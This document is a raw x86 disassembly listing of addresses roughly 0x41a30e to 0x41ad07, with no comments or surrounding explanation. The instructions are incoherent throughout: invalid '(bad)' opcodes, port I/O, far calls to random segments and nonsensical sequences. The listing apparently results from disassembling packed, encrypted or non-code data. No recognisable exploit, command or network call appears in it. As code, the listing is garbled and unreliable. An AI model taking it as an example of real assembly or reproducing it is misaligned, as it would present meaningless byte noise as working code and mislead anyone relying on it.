  41a30e:	xor    cl,BYTE PTR [ebx]
	...
  41a374:	neg    DWORD PTR [eax-0x58]
  41a377:	adc    ebp,DWORD PTR [edi+0x15fcfff3]
  41a37d:	pop    esp
  41a37e:	xchg   ebp,eax
  41a37f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a380:	dec    edx
  41a381:	sbb    eax,edx
  41a383:	ds call 0x441a49e
  41a389:	add    DWORD PTR [eax],eax
  41a38b:	add    BYTE PTR [ecx+0x4c],bl
  41a38e:	test   al,0xd2
  41a390:	xchg   esi,eax
  41a391:	sub    esi,ebp
  41a393:	xchg   DWORD PTR [ebp+0x37d34620],ebp
  41a399:	(bad)  
  41a39a:	push   edi
  41a39b:	push   0x22c4bc2e
  41a3a0:	mov    bh,0xb7
  41a3a2:	cli    
  41a3a3:	in     al,0xdb
  41a3a5:	xchg   eax,esi
  41a3a7:	inc    eax
  41a3a8:	in     eax,dx
  41a3a9:	add    eax,0x593b3819
  41a3ae:	cmp    BYTE PTR [edi-0x458152af],0x68
  41a3b5:	mov    ebx,0xe11a8fa8
  41a3ba:	add    DWORD PTR [eax+0x6046bd98],edi
  41a3c0:	enter  0x3ee8,0xdc
  41a3c4:	cdq    
  41a3c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3c6:	call   0x8449:0x93caf4f0
  41a3cd:	pop    edx
  41a3ce:	cmp    al,0xe0
  41a3d0:	add    DWORD PTR [ebp-0x54],esi
  41a3d3:	jge    0x41a399
  41a3d5:	sbb    al,0xe2
  41a3d8:	and    eax,DWORD PTR [eax+0x42]
  41a3db:	mov    ecx,0xfd54e1bd
  41a3e0:	adc    DWORD PTR [edi],edx
  41a3e2:	or     BYTE PTR [ecx+0x34],bh
  41a3e5:	lods   al,BYTE PTR ds:[esi]
  41a3e6:	daa    
  41a3e7:	shl    BYTE PTR [eax],cl
  41a3e9:	dec    eax
  41a3ea:	push   edx
  41a3eb:	psraw  mm3,QWORD PTR [eax+0x3]
  41a3ef:	dec    esi
  41a3f0:	or     eax,DWORD PTR [ebp+0x3a]
  41a3f3:	cwde   
  41a3f4:	pop    edx
  41a3f5:	enter  0xf845,0xbc
  41a3f9:	sub    ebp,DWORD PTR [edi+0x1e]
  41a3fc:	push   ebx
  41a3fd:	es inc esi
  41a3ff:	loopne 0x41a427
  41a401:	push   ecx
  41a402:	xlat   BYTE PTR ds:[ebx]
  41a403:	xchg   DWORD PTR [eax],ebp
  41a405:	mov    eax,0xa60afe7f
  41a40a:	les    esp,FWORD PTR [ecx]
  41a40c:	xchg   ebx,eax
  41a40d:	mov    DWORD PTR [ebp+0x300158de],esp
  41a413:	loop   0x41a460
  41a415:	sbb    DWORD PTR [ebp-0x6485953d],ecx
  41a41b:	pushf  
  41a41c:	push   edi
  41a41d:	pop    ebp
  41a41e:	push   edi
  41a41f:	sbb    eax,0xad05cabf
  41a424:	mov    ax,0xff7
  41a428:	xlat   BYTE PTR ds:[ebx]
  41a429:	jl     0x41a3ca
  41a42b:	pop    esi
  41a42c:	add    al,0x1e
  41a42e:	test   al,0x73
  41a430:	or     al,BYTE PTR [esi-0xa]
  41a433:	sub    al,0x91
  41a435:	mov    cs,WORD PTR [edi+0x38e1621c]
  41a43b:	mov    esp,0xa13e2b22
  41a440:	scas   eax,DWORD PTR es:[edi]
  41a441:	or     dh,dl
  41a443:	clc    
  41a444:	mov    ds:0xc61c9789,eax
  41a449:	ret    0x49a9
  41a44c:	xchg   esp,eax
  41a44d:	ss fwait
  41a44f:	mov    bh,0xc4
  41a451:	sbb    dl,bh
  41a453:	fwait
  41a454:	call   0xcafbd58b
  41a459:	mov    ebp,ebp
  41a45b:	pop    ebp
  41a45c:	dec    eax
  41a45d:	sub    eax,0xb67b460
  41a462:	rcl    bh,1
  41a464:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a465:	dec    si
  41a467:	int3   
  41a468:	cwde   
  41a469:	jns    0x41a43f
  41a46b:	dec    edi
  41a46c:	pop    es
  41a46d:	into   
  41a46e:	or     DWORD PTR [esp+eax*8+0x3231f248],ebx
  41a475:	sub    ebp,esi
  41a477:	jle    0x41a479
  41a479:	stos   BYTE PTR es:[edi],al
  41a47a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a47b:	pop    edi
  41a47c:	xor    ch,ch
  41a47e:	jnp    0x41a451
  41a480:	adc    BYTE PTR [edi-0x3c],ah
  41a483:	dec    edx
  41a484:	(bad)  
  41a485:	inc    eax
  41a487:	inc    edi
  41a488:	dec    ebx
  41a489:	fbld   TBYTE PTR [esi+edx*1-0x5]
  41a48d:	push   0xf404
	...
  41a4f2:	add    BYTE PTR [eax],al
  41a4f4:	mov    edi,0xff0fcf82
  41a4f9:	dec    edi
  41a4fa:	push   DWORD PTR [edx+0x5f4d0d09]
  41a500:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a502:	jl     0x41a519
  41a504:	in     al,dx
  41a505:	push   ss
  41a506:	add    DWORD PTR [eax],eax
  41a508:	add    al,0x1
  41a50a:	add    BYTE PTR [eax],al
  41a50c:	daa    
  41a50d:	cmp    al,0x6f
  41a50f:	sbb    al,0x91
  41a511:	inc    esi
  41a512:	cmp    al,0x55
  41a514:	pop    esi
  41a515:	daa    
  41a516:	xchg   ebx,eax
  41a517:	les    ecx,FWORD PTR [ebx+0x796b9c07]
  41a51d:	mov    edx,DWORD PTR ds:0xac2835af
  41a523:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a524:	mov    bh,0x15
  41a526:	xchg   ebp,eax
  41a527:	push   ebx
  41a528:	ins    BYTE PTR es:[edi],dx
  41a529:	(bad)  
  41a52a:	inc    BYTE PTR [esi+0x31b68fff]
  41a530:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a531:	mov    eax,ds:0x7e364f1d
  41a536:	aas    
  41a537:	cld    
  41a538:	xchg   ecx,eax
  41a539:	adc    al,0x32
  41a53b:	mov    ch,0xfc
  41a53d:	outs   dx,DWORD PTR ds:[esi]
  41a53e:	shl    BYTE PTR [esi+ecx*1+0xc],0x99
  41a543:	mov    dl,0x8f
  41a545:	shl    BYTE PTR [edi+0x17],0x7a
  41a549:	inc    esp
  41a54a:	ins    BYTE PTR es:[edi],dx
  41a54b:	or     DWORD PTR [ebp-0x43],eax
  41a54e:	pop    eax
  41a54f:	push   ss
  41a550:	hlt    
  41a551:	xor    al,0xfc
  41a553:	or     eax,edx
  41a555:	mov    al,0xd5
  41a557:	div    esi
  41a559:	jmp    0xc337:0x4b83e011
  41a560:	cld    
  41a561:	int3   
  41a562:	test   eax,0xa39c0aa4
  41a567:	stc    
  41a568:	icebp  
  41a569:	cmp    ecx,DWORD PTR [ecx]
  41a56b:	retf   
  41a56c:	mov    cl,0x1b
  41a56e:	pop    es
  41a56f:	imul   eax,DWORD PTR [eax+0x34c6dda5],0x2f
  41a576:	dec    ebp
  41a577:	mov    ds:0xb279fb9c,eax
  41a57c:	aam    0x25
  41a57e:	in     eax,dx
  41a57f:	in     eax,0x1
  41a581:	in     al,dx
  41a582:	or     ebx,edi
  41a584:	mov    al,0xb4
  41a586:	les    eax,FWORD PTR [edi+0x63]
  41a589:	xchg   ebp,eax
  41a58a:	(bad)
  41a58e:	add    DWORD PTR ds:0x17fe994a,esi
  41a594:	cdq    
  41a595:	rcl    BYTE PTR [eax-0x6c72e97a],0xeb
  41a59c:	mov    gs,edi
  41a59e:	adc    DWORD PTR [edx-0x71],esp
  41a5a1:	and    BYTE PTR [esi],dh
  41a5a3:	repnz push cs
  41a5a5:	push   edx
  41a5a6:	std    
  41a5a7:	dec    esi
  41a5a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5a9:	cs (bad) 
  41a5ab:	xchg   ebx,eax
  41a5ac:	cmp    BYTE PTR [eax],ch
  41a5ae:	call   0xbdb3a24a
  41a5b3:	and    dl,ah
  41a5b5:	bound  ecx,QWORD PTR ds:0x73aaa06c
  41a5bb:	(bad)  
  41a5bc:	fsubr  st,st(5)
  41a5be:	dec    eax
  41a5bf:	ret    0xb35b
  41a5c2:	out    dx,al
  41a5c3:	sub    eax,0xaf6cda18
  41a5c8:	aad    0xfa
  41a5ca:	jno    0x41a5ab
  41a5cc:	push   edi
  41a5cd:	(bad)  [ecx]
  41a5cf:	stc    
  41a5d0:	adc    eax,DWORD PTR [edi+0x1548f4d0]
  41a5d6:	jle    0x41a58f
  41a5d8:	pop    edx
  41a5d9:	inc    esp
  41a5da:	pop    ebx
  41a5dc:	pop    eax
  41a5dd:	ds xchg edx,eax
  41a5df:	add    DWORD PTR ds:0x4a72060f,esp
  41a5e5:	repz bnd js 0x41a5d4
  41a5e9:	push   0x13
  41a5eb:	jmp    0x41a5ac
  41a5ed:	jmp    0x41a60f
  41a5ef:	push   edx
  41a5f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5f1:	mov    al,0x94
  41a5f3:	cmp    DWORD PTR [ebx+ebx*8],ecx
  41a5f6:	add    bh,ah
  41a5f8:	retf   
  41a5f9:	aas    
  41a5fa:	call   0x7707f40b
  41a5ff:	mov    esp,0xfcad10d6
  41a604:	or     ebx,DWORD PTR [ecx]
  41a606:	cli    
  41a607:	dec    eax
  41a608:	add    ecx,ebp
  41a60a:	mov    ds:0xcd64899c,al
  41a60f:	sub    al,BYTE PTR [eax]
	...
  41a671:	add    BYTE PTR [eax],al
  41a673:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41a677:	inc    ecx
  41a678:	ja     0x41a6e5
  41a67a:	pop    esp
  41a67b:	aas    
  41a67c:	dec    ecx
  41a67d:	push   0x1b01a625
  41a682:	cmp    al,0x49
  41a684:	lock pop ss
  41a686:	add    DWORD PTR [eax],eax
  41a688:	add    al,0x1
  41a68a:	add    BYTE PTR [eax],al
  41a68c:	or     BYTE PTR [ecx+0x4],bl
  41a68f:	mov    dl,0xac
  41a691:	sbb    al,0xb0
  41a693:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a694:	jg     0x41a70b
  41a696:	add    BYTE PTR [edi*2-0x26fe934],0x81
  41a69e:	cld    
  41a69f:	inc    ebp
  41a6a0:	push   es
  41a6a1:	dec    ebx
  41a6a2:	popf   
  41a6a3:	dec    esp
  41a6a4:	shl    DWORD PTR [edi+0x174de882],cl
  41a6aa:	push   ebx
  41a6ab:	inc    edx
  41a6ac:	inc    ecx
  41a6ad:	movq   QWORD PTR [ecx],mm7
  41a6b0:	les    ebp,FWORD PTR [ebp-0x1ba835e7]
  41a6b6:	int    0x7f
  41a6b8:	xchg   ebp,eax
  41a6b9:	jge    0x41a70f
  41a6bb:	sbb    ebp,DWORD PTR [esi]
  41a6bd:	mov    ecx,0xe15d2b8e
  41a6c2:	push   esi
  41a6c3:	adc    esp,edx
  41a6c5:	xchg   BYTE PTR [ebx-0x7b16e0d8],cl
  41a6cb:	cmp    eax,0x5014546f
  41a6d0:	js     0x41a66d
  41a6d2:	mov    edx,DWORD PTR [ecx]
  41a6d4:	inc    edx
  41a6d5:	fucomi st,st(7)
  41a6d7:	xor    al,ah
  41a6d9:	mov    ch,0xe5
  41a6db:	gs out 0xb9,eax
  41a6de:	push   0xeb8f67e4
  41a6e3:	xchg   DWORD PTR [edx],esp
  41a6e5:	and    BYTE PTR [ecx],bl
  41a6e7:	mov    cl,0x99
  41a6e9:	inc    ebx
  41a6ea:	and    bh,BYTE PTR [esi]
  41a6ec:	mov    ds:0x5215fa6d,al
  41a6f1:	ds aas 
  41a6f3:	push   esi
  41a6f4:	mov    eax,ds:0x9dbc79ee
  41a6f9:	mov    dh,0x52
  41a6fb:	ins    DWORD PTR es:[edi],dx
  41a6fc:	adc    DWORD PTR [eax-0x52],0xffffffcc
  41a700:	sbb    ah,dh
  41a702:	and    edx,DWORD PTR [ebp-0x31]
  41a705:	inc    ebx
  41a706:	fisttp DWORD PTR [ebx*2-0x4bfa1c4e]
  41a70d:	test   BYTE PTR [ebx-0x30],bh
  41a710:	std    
  41a711:	jnp    0x41a6cb
  41a713:	ror    DWORD PTR [esi+0x363caa27],0xc8
  41a71a:	(bad)  
  41a71b:	jo     0x41a6c4
  41a71d:	mov    ds:0x998e1f91,eax
  41a722:	repz sbb eax,0x73b539e9
  41a728:	(bad)  
  41a729:	aad    0x91
  41a72b:	iret   
  41a72c:	popf   
  41a72d:	into   
  41a72e:	mov    ds:0xf4c5ed4a,eax
  41a733:	das    
  41a734:	retf   
  41a735:	ret    
  41a736:	push   ebx
  41a737:	cmp    esp,0xffffff8c
  41a73a:	test   bl,al
  41a73c:	cs push ss
  41a73e:	int3   
  41a73f:	and    dl,ah
  41a741:	add    ecx,DWORD PTR [eax+eiz*4-0x6a]
  41a745:	adc    eax,0x8d8dc314
  41a74a:	xchg   bh,ah
  41a74c:	push   ds
  41a74d:	mov    ds:0xd6d76589,al
  41a752:	aam    0xb9
  41a754:	sbb    al,0xfc
  41a756:	(bad)  
  41a757:	fst    QWORD PTR [esi]
  41a759:	loop   0x41a7d2
  41a75b:	push   edi
  41a75c:	pop    ebx
  41a75d:	add    al,0x6a
  41a75f:	imul   edi,DWORD PTR [edx+0x6779c094],0x3ad1654
  41a769:	lock addr16 mov ds:0x6075,eax
  41a76e:	add    al,0x39
  41a770:	sbb    DWORD PTR [eax],edi
  41a772:	xchg   ecx,eax
  41a773:	ss mov ebp,0xb66f309b
  41a779:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a77a:	imul   esi,DWORD PTR [edx+0x78],0xcaaf113b
  41a781:	in     al,0xd5
  41a783:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a784:	imul   ecx,edi,0xffffffb2
  41a787:	adc    DWORD PTR [ecx+ebx*8+0x76],0xd637c86f
  41a78f:	xor    al,0x0
	...
  41a7f1:	add    BYTE PTR [eax],al
  41a7f3:	add    bl,dh
  41a7f5:	xchg   edi,eax
  41a7f6:	jae    0x41a77f
  41a7f8:	ja     0x41a7e1
  41a7fa:	div    edi
  41a7fc:	mov    ds:0xf65327ca,al
  41a801:	push   ebp
  41a802:	xchg   edi,eax
  41a803:	xor    esp,0x4000118
  41a809:	add    DWORD PTR [eax],eax
  41a80b:	add    BYTE PTR [esi-0x3a],al
  41a80e:	jo     0x41a7c1
  41a810:	and    al,0xa2
  41a812:	cmp    BYTE PTR [eax+esi*1-0x67],cl
  41a816:	jmp    0x41a7d5
  41a818:	les    esp,FWORD PTR [ecx-0x23]
  41a81b:	lahf   
  41a81c:	mov    dh,0xda
  41a81e:	inc    edx
  41a81f:	(bad)  
  41a820:	addr16 and eax,0x94bd06a4
  41a826:	and    edx,DWORD PTR [eax-0x6c29d87b]
  41a82c:	mov    es,WORD PTR [esi+0x2d3a8915]
  41a832:	sbb    BYTE PTR [ecx-0x50],dl
  41a835:	outs   dx,BYTE PTR ds:[esi]
  41a836:	dec    ebx
  41a837:	and    DWORD PTR [edi+0x17dc0795],esi
  41a83d:	ret    
  41a83e:	sub    eax,0xe74d0b21
  41a843:	pop    ss
  41a844:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a845:	pusha  
  41a846:	add    eax,0x73670e44
  41a84b:	pop    es
  41a84c:	aam    0x40
  41a84e:	loopne 0x41a7e4
  41a850:	sub    ah,BYTE PTR [eax+0x44]
  41a853:	pop    ebx
  41a854:	xor    eax,0x1589e45e
  41a859:	mov    dl,0x7e
  41a85b:	push   edi
  41a85c:	arpl   WORD PTR [ebx+edi*4],bx
  41a85f:	jmp    0x41ca4847
  41a864:	push   esi
  41a865:	mov    ah,0xe6
  41a867:	and    BYTE PTR [ecx+ebx*4-0xc05c438],dh
  41a86e:	xor    eax,0xf613b138
  41a873:	xchg   ebp,eax
  41a874:	dec    esi
  41a875:	std    
  41a876:	and    edx,ebx
  41a878:	ficomp WORD PTR [ecx]
  41a87a:	mov    eax,0x3b3d3d1e
  41a87f:	xchg   esp,eax
  41a880:	push   esi
  41a881:	js     0x41a820
  41a883:	cmp    BYTE PTR [ebp-0x12a09f4a],0x54
  41a88a:	dec    edi
  41a88b:	add    BYTE PTR ds:0x89976002,dl
  41a891:	push   esi
  41a892:	or     BYTE PTR [edx-0x3c50016e],0x47
  41a899:	adc    ebx,ebx
  41a89b:	mov    ebp,0x6bb4a080
  41a8a0:	sti    
  41a8a1:	adc    BYTE PTR [ecx+0x7e],bl
  41a8a4:	shl    BYTE PTR [ecx-0xd],cl
  41a8a7:	ss jmp 0x1686:0xa47f74cc
  41a8af:	fsubr  QWORD PTR [esi]
  41a8b1:	les    edx,FWORD PTR [edi-0x2b]
  41a8b4:	enter  0x5b68,0x9
  41a8b8:	fdiv   DWORD PTR [esi]
  41a8ba:	scas   eax,DWORD PTR es:[edi]
  41a8bb:	out    dx,al
  41a8bc:	mov    DWORD PTR [esi],edi
  41a8be:	or     DWORD PTR [eax+0x11f2c9c6],0x76
  41a8c5:	and    dh,al
  41a8c7:	xor    BYTE PTR [edi+0x22],bl
  41a8ca:	push   edx
  41a8cb:	hlt    
  41a8cc:	sub    BYTE PTR [ebp+0x25b19f7b],0x3d
  41a8d3:	retf   
  41a8d4:	lods   al,BYTE PTR ds:[esi]
  41a8d5:	mov    al,0x24
  41a8d7:	les    ebp,FWORD PTR [edx]
  41a8d9:	push   eax
  41a8da:	out    dx,al
  41a8db:	pop    ebx
  41a8dc:	sbb    edx,ecx
  41a8de:	js     0x41a92e
  41a8e0:	sbb    esp,DWORD PTR [ebp-0x41322e96]
  41a8e6:	add    ebp,DWORD PTR [edx+eax*4-0x77]
  41a8ea:	add    DWORD PTR [ebp-0x2c3d78f8],esi
  41a8f0:	and    esi,edx
  41a8f2:	dec    esp
  41a8f3:	ja     0x41a8e0
  41a8f5:	in     al,0xb8
  41a8f7:	(bad)  
  41a8f8:	jns    0x41a884
  41a8fa:	int3   
  41a8fb:	push   ds
  41a8fc:	cmp    al,0x93
  41a8fe:	mov    WORD PTR [esi-0x5feb7c25],?
  41a904:	dec    ebp
  41a905:	fisub  WORD PTR ds:[edi+0x180c5a6b]
  41a90c:	scas   al,BYTE PTR es:[edi]
  41a90d:	cs pushf 
  41a90f:	mov    ecx,0x0
	...
  41a974:	xor    eax,0xcf4a867e
  41a979:	cli    
  41a97a:	std    
  41a97b:	jg     0x41a9cb
  41a97d:	push   edx
  41a97e:	pushf  
  41a97f:	dec    esp
  41a980:	sbb    BYTE PTR [ecx+0x19f862d0],0x1
  41a987:	add    BYTE PTR [ecx+eax*1],al
  41a98a:	add    BYTE PTR [eax],al
  41a98c:	stc    
  41a98d:	(bad)  
  41a98e:	or     eax,0x4f705e2c
  41a993:	shl    DWORD PTR [esi-0x2b39220a],1
  41a999:	shl    BYTE PTR [ecx+ebx*4],cl
  41a99c:	xor    edx,DWORD PTR [esp+ebp*8]
  41a99f:	mov    al,ds:0x4f9e3c9c
  41a9a4:	push   cs
  41a9a5:	pop    esp
  41a9a6:	sbb    DWORD PTR [edx-0x688c6b37],edx
  41a9ac:	ss jne 0x41a981
  41a9af:	cmc    
  41a9b0:	out    0x39,eax
  41a9b2:	popa   
  41a9b3:	jne    0x41a9f2
  41a9b5:	addr16 je 0x41a974
  41a9b8:	sbb    al,0xeb
  41a9ba:	pop    esp
  41a9bb:	out    0xf8,al
  41a9bd:	add    DWORD PTR [edi+0x5ab544cf],ecx
  41a9c3:	retf   
  41a9c4:	rcl    BYTE PTR [edx],cl
  41a9c6:	mov    ?,WORD PTR [edi+0x19]
  41a9c9:	shr    DWORD PTR [edx+0x6bb210f4],0xee
  41a9d0:	add    eax,DWORD PTR [eax+eiz*1]
  41a9d3:	mov    BYTE PTR [edi-0x40],bl
  41a9d6:	fs test al,0x27
  41a9d9:	rcr    DWORD PTR [esi-0x54],cl
  41a9dc:	cmp    dh,BYTE PTR [esp+edx*1-0x3e4d1482]
  41a9e3:	in     eax,dx
  41a9e4:	(bad)  [edx]
  41a9e6:	shl    DWORD PTR [edi+esi*2-0x33],1
  41a9ea:	push   ebp
  41a9eb:	dec    esp
  41a9ec:	jecxz  0x41a970
  41a9ee:	sub    DWORD PTR ds:0x943d64f1,edx
  41a9f4:	pop    ss
  41a9f5:	mov    esp,0x1a461d2d
  41a9fa:	mov    al,0x4f
  41a9fc:	inc    esp
  41a9fd:	pusha  
  41a9fe:	and    al,dh
  41aa00:	sbb    al,0x55
  41aa02:	paddusb mm5,mm0
  41aa05:	mov    edi,0x47b36a1
  41aa0a:	fs dec esi
  41aa0c:	pop    ss
  41aa0d:	shl    BYTE PTR [eax-0xa],cl
  41aa10:	outs   dx,BYTE PTR ds:[esi]
  41aa11:	sbb    DWORD PTR [edx+0x67],edx
  41aa14:	sub    cl,BYTE PTR [ebp+0x6e]
  41aa17:	push   ebx
  41aa18:	ds scas eax,DWORD PTR es:[edi]
  41aa1a:	call   0x4f4a:0xebdf15b6
  41aa21:	ds push eax
  41aa23:	dec    ecx
  41aa24:	ja     0x41aa5f
  41aa26:	je     0x41a9ac
  41aa28:	sbb    al,0x43
  41aa2a:	or     esi,DWORD PTR [esi]
  41aa2c:	push   esi
  41aa2d:	sbb    dh,BYTE PTR [ecx]
  41aa2f:	ins    DWORD PTR es:[edi],dx
  41aa30:	xor    BYTE PTR [edi+ebp*8+0x6e883f19],bh
  41aa37:	retf   
  41aa38:	inc    ebx
  41aa39:	lds    ebx,FWORD PTR [ebp+0x1b]
  41aa3c:	test   BYTE PTR [edi+0x42],bl
  41aa3f:	call   0x1b10:0xed2a53f4
  41aa46:	pushf  
  41aa47:	retf   0x3d47
  41aa4a:	fwait
  41aa4b:	sbb    al,0x4e
  41aa4d:	leave  
  41aa4e:	or     eax,0x3395aa22
  41aa53:	pop    ecx
  41aa54:	adc    al,0x12
  41aa56:	mov    ah,0x83
  41aa58:	sub    DWORD PTR [ebp+0x18],esi
  41aa5b:	fwait
  41aa5c:	add    al,0x1e
  41aa5e:	push   esp
  41aa5f:	fcom   QWORD PTR [edi+0x126fbf18]
  41aa65:	outs   dx,DWORD PTR ds:[esi]
  41aa66:	or     eax,0x53af6081
  41aa6b:	fidiv  DWORD PTR [ebp+0x614836d8]
  41aa71:	mov    bh,0x6e
  41aa73:	call   0xec5d:0x9d996815
  41aa7a:	into   
  41aa7b:	xor    al,ch
  41aa7d:	xlat   BYTE PTR ds:[ebx]
  41aa7e:	pop    edx
  41aa7f:	dec    ebp
  41aa80:	retf   0xdbd9
  41aa83:	iret   
  41aa84:	lock mov dh,0x1a
  41aa87:	in     eax,0xed
  41aa89:	mov    dl,0x4f
  41aa8b:	jg     0x41aa15
  41aa8d:	adc    esp,DWORD PTR [ecx+0x61]
	...
  41aaf4:	test   DWORD PTR [ecx],0xfdfeb4dc
  41aafa:	inc    DWORD PTR [ebx+0x5f]
  41aafd:	sbb    BYTE PTR [esi+0x43],ah
  41ab00:	jne    0x41ab2d
  41ab02:	stos   BYTE PTR es:[edi],al
  41ab03:	(bad)  
  41ab04:	cld    
  41ab05:	sbb    al,BYTE PTR [ecx]
  41ab07:	add    BYTE PTR [ecx+eax*1],al
  41ab0a:	add    BYTE PTR [eax],al
  41ab0c:	cdq    
  41ab0d:	push   edx
  41ab0e:	loop   0x41ab04
  41ab10:	and    bl,cl
  41ab12:	jmp    0x90cdecb2
  41ab17:	dec    esi
  41ab18:	dec    ebp
  41ab19:	push   ebx
  41ab1a:	icebp  
  41ab1b:	jb     0x41ab0f
  41ab1d:	iret   
  41ab1e:	mov    ch,BYTE PTR [edi]
  41ab20:	addr16 mov bl,0x9a
  41ab23:	push   esi
  41ab24:	stos   DWORD PTR es:[edi],eax
  41ab25:	lahf   
  41ab26:	sbb    BYTE PTR [esi+0x35],0x7f
  41ab2a:	jo     0x41ab65
  41ab2c:	ret    
  41ab2d:	test   eax,0xe042ef72
  41ab32:	rcl    DWORD PTR [edx-0x24],1
  41ab35:	inc    ebx
  41ab36:	jns    0x41aac7
  41ab38:	hlt    
  41ab39:	add    eax,0xd494e437
  41ab3e:	jno    0x41aae6
  41ab40:	int3   
  41ab41:	push   ebx
  41ab42:	cmp    bl,BYTE PTR [ecx]
  41ab44:	and    DWORD PTR [ecx+0x53],ecx
  41ab47:	dec    esi
  41ab48:	push   esp
  41ab49:	xor    esi,0xffffffa6
  41ab4c:	or     al,0x84
  41ab4e:	push   cs
  41ab4f:	pop    esp
  41ab50:	push   es
  41ab51:	or     eax,0x62dcccc8
  41ab56:	or     al,0x89
  41ab58:	test   al,0x2
  41ab5a:	stc    
  41ab5b:	or     BYTE PTR [ecx],0x37
  41ab5e:	call   0x3547:0x2fea99a5
  41ab65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab66:	mov    ds:0x32822d4f,al
  41ab6b:	das    
  41ab6c:	aas    
  41ab6d:	in     eax,dx
  41ab6e:	xchg   edx,eax
  41ab6f:	add    al,0xca
  41ab71:	sub    dl,ah
  41ab73:	(bad)  
  41ab74:	scas   eax,DWORD PTR es:[edi]
  41ab75:	xchg   BYTE PTR [ebx-0x75],ch
  41ab78:	mov    al,0x81
  41ab7a:	xchg   DWORD PTR [ecx+0x42],ebx
  41ab7d:	pop    edi
  41ab7e:	stc    
  41ab7f:	mov    ah,0x2a
  41ab81:	mov    edi,0xc4894950
  41ab86:	push   ds
  41ab87:	xchg   ebx,eax
  41ab88:	or     al,BYTE PTR ds:0xf41f43b6
  41ab8e:	sahf   
  41ab8f:	lock lea ebx,[esi+0x79]
  41ab93:	inc    edx
  41ab94:	test   DWORD PTR [ecx+eiz*2-0x53],edx
  41ab98:	jmp    0x41ab3d
  41ab9a:	fs mov esi,0x48d29c5c
  41aba0:	inc    ecx
  41aba1:	mov    esp,0xc84f7291
  41aba6:	pop    ebx
  41aba7:	sub    DWORD PTR [esp+ecx*4-0x2220c5d],0xffffff86
  41abaf:	fcom   QWORD PTR [ebx-0x546e0734]
  41abb5:	sub    bh,BYTE PTR [edi+0x14a29277]
  41abbb:	aaa    
  41abbc:	fcmovnb st,st(0)
  41abbe:	ins    DWORD PTR es:[edi],dx
  41abbf:	mov    cl,bl
  41abc1:	pusha  
  41abc2:	cmp    al,BYTE PTR [eax+0x23d3a013]
  41abc8:	mov    ecx,0x97cf2c02
  41abcd:	sbb    ah,0xc
  41abd0:	stos   BYTE PTR es:[edi],al
  41abd1:	adc    bh,BYTE PTR [edi-0x37]
  41abd4:	ins    BYTE PTR es:[edi],dx
  41abd5:	lods   al,BYTE PTR cs:[esi]
  41abd7:	aam    0xb8
  41abd9:	xor    ch,BYTE PTR [eax+0x67]
  41abdc:	je     0x41abab
  41abde:	xchg   DWORD PTR [esi],esp
  41abe0:	dec    esp
  41abe1:	out    0xa3,al
  41abe3:	and    BYTE PTR ds:0xab0a538c,al
  41abe9:	dec    esp
  41abea:	clc    
  41abeb:	mov    edi,?
  41abed:	sub    BYTE PTR [ecx],ah
  41abef:	inc    esi
  41abf0:	xchg   ecx,eax
  41abf1:	aas    
  41abf2:	inc    esi
  41abf3:	mov    bh,0x23
  41abf5:	jge    0x41ac13
  41abf7:	jmp    0x41abd8
  41abf9:	sahf   
  41abfa:	imul   ebx,DWORD PTR ds:0x4928e4bc,0x5e43cad3
  41ac04:	(bad)  
  41ac05:	jecxz  0x41ac53
  41ac07:	mov    cl,BYTE PTR [ebx]
  41ac09:	add    al,0xaf
  41ac0b:	mov    esi,0xaa0fa59e
	...
  41ac74:	push   0x49
  41ac76:	es cmp al,0x27
  41ac79:	jg     0x41acf5
  41ac7b:	pop    edi
  41ac7c:	or     al,0x44
  41ac7e:	xor    ah,BYTE PTR [ebp+ecx*8-0x15]
  41ac82:	push   eax
  41ac83:	add    BYTE PTR [si],bl
  41ac86:	add    DWORD PTR [eax],eax
  41ac88:	add    al,0x1
  41ac8a:	add    BYTE PTR [eax],al
  41ac8c:	sbb    edx,esi
  41ac8e:	mov    al,BYTE PTR [ebp+0x7314d22c]
  41ac94:	xor    al,0x9e
  41ac96:	or     edx,edx
  41ac98:	(bad)  
  41ac9a:	rcl    DWORD PTR [esp+edx*1-0x80],1
  41ac9e:	mov    edi,0xca990644
  41aca3:	mov    cl,0xb3
  41aca5:	pop    esi
  41aca6:	mov    ebp,0x9ec16c6a
  41acab:	sub    eax,0xff2fcca4
  41acb0:	sbb    BYTE PTR [ebx+0xe],0x13
  41acb4:	arpl   WORD PTR [eax-0x709ed461],bx
  41acba:	sub    DWORD PTR [edi+0x26],edi
  41acbd:	das    
  41acbe:	(bad)  
  41acbf:	inc    ecx
  41acc0:	pop    ebp
  41acc1:	data16 xor BYTE PTR [edx],ch
  41acc4:	or     dl,BYTE PTR [ebx-0x28]
  41acc7:	icebp  
  41acc8:	bound  ebx,QWORD PTR [eax]
  41acca:	xor    al,BYTE PTR [edi]
  41accc:	pop    ebx
  41accd:	fisubr WORD PTR [ebp+0x2c4418cc]
  41acd3:	fidivr DWORD PTR [esi+0x20]
  41acd6:	push   ebp
  41acd7:	fbld   TBYTE PTR [ecx-0x39]
  41acda:	hlt    
  41acdb:	sub    ebp,DWORD PTR [ebp-0x4164663d]
  41ace1:	mov    esi,0x881dde68
  41ace6:	loopne 0x41acb0
  41ace8:	pop    ecx
  41ace9:	mov    ch,0xac
  41aceb:	ret    0x9622
  41acee:	push   esp
  41acef:	or     DWORD PTR [esi-0x16e87080],ebp
  41acf5:	pop    es
  41acf6:	add    BYTE PTR [edx],ch
  41acf8:	bound  ebp,QWORD PTR [edx+0x7c]
  41acfb:	xchg   BYTE PTR [ebx+0x2c],dl
  41acfe:	mov    esp,0x54f79873
  41ad03:	mov    al,0xa1
  41ad05:	cmp    al,0xf
  41ad07:	mov    ds:0xe30fa1c3,al
